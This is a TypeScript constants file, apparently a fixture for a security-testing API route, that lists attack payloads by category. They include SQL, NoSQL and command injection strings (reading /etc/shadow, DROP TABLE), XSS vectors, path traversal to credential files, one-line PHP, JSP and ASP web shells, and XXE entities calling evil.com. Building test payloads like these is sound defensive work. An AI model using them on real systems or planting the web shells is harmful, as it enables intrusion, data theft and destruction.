// 安全测试攻击载荷常量定义
// 用于安全测试 API 路由

// 认证绕过攻击载荷
export const AUTH_BYPASS_PAYLOADS = {
  sql_injection: [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR 'a'='a",
    "') OR ('1'='1",
  ],
  sql_injection_auth: [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR 'a'='a",
    "') OR ('1'='1",
  ],
  nosql_injection: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.username"}',
  ],
  nosql_injection_auth: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.username"}',
  ],
  ldap_injection: [
    "*)(uid=*",
    "*)(|(uid=*",
    "*)(&(uid=*",
    "*))%00",
  ],
  xpath_injection: [
    "' or '1'='1",
    "' or 1=1 or ''='",
    "x' or name()='username' or 'x'='y",
  ],
  header_manipulation: [
    "admin",
    "administrator",
    "root",
    "guest",
  ],
  jwt_manipulation: [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.invalid",
    "null",
    "",
  ],
  session_manipulation: [
    "admin_session_id",
    "PHPSESSID=admin",
    "JSESSIONID=admin",
    "session_token=admin",
  ],
  parameter_pollution: [
    "user=guest&user=admin",
    "role=user&role=admin",
    "access=read&access=write",
  ],
  common_passwords: [
    "admin",
    "password",
    "123456",
    "admin123",
    "root",
    "guest",
    "",
  ],
  timing_attack_usernames: [
    "admin",
    "administrator",
    "root",
    "guest",
    "user",
    "test",
  ],
};

// CSRF攻击载荷
export const CSRF_ATTACK_PAYLOADS = {
  basic_csrf: [
    { description: "POST transfer without CSRF token", headers: {}, method: "POST" },
    { description: "GET account deletion", headers: {}, method: "GET" },
    { description: "PUT password change", headers: {}, method: "PUT" },
  ],
  missing_token: [
    { description: "No CSRF token in request", headers: {} },
    { description: "Empty CSRF token", headers: { "X-CSRF-Token": "" } },
    { description: "Null CSRF token", headers: { "X-CSRF-Token": "null" } },
  ],
  invalid_token: [
    { description: "Invalid CSRF token format", headers: { "X-CSRF-Token": "invalid-format-123" } },
    { description: "Expired CSRF token", headers: { "X-CSRF-Token": "expired-token-456" } },
    { description: "Wrong CSRF token value", headers: { "X-CSRF-Token": "wrong-value-789" } },
  ],
  token_reuse: [
    { description: "Reused CSRF token", headers: { "X-CSRF-Token": "reused-token-123" } },
    { description: "Shared CSRF token across sessions", headers: { "X-CSRF-Token": "shared-token-456" } },
  ],
  header_manipulation: [
    { description: "Modified X-CSRF-Token header", headers: { "X-CSRF-Token": "modified-token", "Origin": "https://malicious.com" } },
    { description: "Removed CSRF header", headers: { "Origin": "https://evil.com" }, removeOrigin: false },
    { description: "Duplicate CSRF headers", headers: { "X-CSRF-Token": "token1", "X-Csrf-Token": "token2", "Origin": "https://trusted.com" } },
  ],
  method_override: [
    { description: "HTTP method override with _method", headers: { "_method": "DELETE" }, body: { _method: "DELETE" } },
    { description: "X-HTTP-Method-Override header", headers: { "X-HTTP-Method-Override": "DELETE" } },
  ],
  content_type_confusion: [
    { description: "application/json to text/plain", headers: { "Content-Type": "text/plain" }, jsonToForm: true },
    { description: "multipart/form-data confusion", headers: { "Content-Type": "multipart/form-data" } },
  ],
  double_submit_bypass: [
    { description: "Cookie vs header mismatch", headers: { "X-CSRF-Token": "header-token" }, cookies: { "csrf_token": "cookie-token" } },
    { description: "Double submit cookie bypass", headers: { "X-CSRF-Token": "bypass-token" } },
  ],
};

// 文件上传攻击载荷
export const FILE_UPLOAD_ATTACK_PAYLOADS = {
  malicious_extensions: [
    { filename: "shell.php", contentType: "application/x-php", description: "PHP shell script" },
    { filename: "backdoor.jsp", contentType: "application/x-jsp", description: "JSP backdoor" },
    { filename: "webshell.asp", contentType: "application/x-asp", description: "ASP webshell" },
    { filename: "malware.exe", contentType: "application/x-executable", description: "Executable malware" },
    { filename: "script.sh", contentType: "application/x-sh", description: "Shell script" },
    { filename: "virus.bat", contentType: "application/x-bat", description: "Batch file virus" },
  ],
  special_characters: [
    { filename: "../../../etc/passwd", description: "Path traversal to passwd file" },
    { filename: "..\\..\\..\\windows\\system32\\config\\sam", description: "Path traversal to SAM file" },
    { filename: "file.php%00.jpg", description: "Null byte injection" },
    { filename: "file.jsp;.jpg", description: "Semicolon injection" },
    { filename: "file.asp:.jpg", description: "Colon injection" },
  ],
  content_types: [
    "application/x-php",
    "application/x-httpd-php",
    "application/x-sh",
    "application/x-executable",
  ],
  payloads: [
    "<?php system($_GET['cmd']); ?>",
    "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>",
  ],
  double_extensions: [
    { filename: "shell.php.jpg", description: "PHP shell disguised as image" },
    { filename: "backdoor.jsp.png", description: "JSP backdoor disguised as PNG" },
    { filename: "webshell.asp.gif", description: "ASP webshell disguised as GIF" },
    { filename: "malware.exe.txt", description: "Executable disguised as text" },
  ],
  null_byte_injection: [
    { filename: "shell.php%00.jpg", description: "PHP shell with null byte injection" },
    { filename: "backdoor.jsp%00.png", description: "JSP backdoor with null byte" },
    { filename: "webshell.asp%00.gif", description: "ASP webshell with null byte" },
  ],
  path_traversal: [
    { filename: "../../../etc/passwd", description: "Unix passwd file traversal" },
    { filename: "..\\..\\..\\windows\\system32\\config\\sam", description: "Windows SAM file traversal" },
    { filename: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", description: "URL encoded path traversal" },
  ],
  oversized_files: [
    { filename: "huge_file_100mb.zip", size: 104857600, description: "100MB ZIP file" },
    { filename: "massive_image_50mb.jpg", size: 52428800, description: "50MB image file" },
    { filename: "large_video_200mb.mp4", size: 209715200, description: "200MB video file" },
  ],
  content_type_mismatch: [
    { filename: "image.jpg", contentType: "text/html", description: "HTML content as JPEG" },
    { filename: "document.pdf", contentType: "image/jpeg", description: "JPEG content as PDF" },
    { filename: "script.js", contentType: "image/png", description: "PNG content as JavaScript" },
  ],
};

// 通用安全攻击载荷
export const ATTACK_PAYLOADS = {
  sql_injection: [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM users--",
    "admin'/*",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "' OR '1'='1' /*",
  ],
  xss_payloads: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
  ],
  path_traversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
  ],
  command_injection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "; cat /etc/shadow",
    "| id",
    "&& cat /etc/hosts",
    "; ps aux",
  ],
  nosql_injection: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.username"}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
  ],
  xxe_payloads: [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
  ],
  header_injection: [
    "Content-Type: text/html\\r\\nSet-Cookie: admin=true",
    "X-Forwarded-For: 127.0.0.1\\r\\nX-Real-IP: 127.0.0.1",
    "User-Agent: Mozilla/5.0\\r\\nX-Injected-Header: malicious",
  ],
};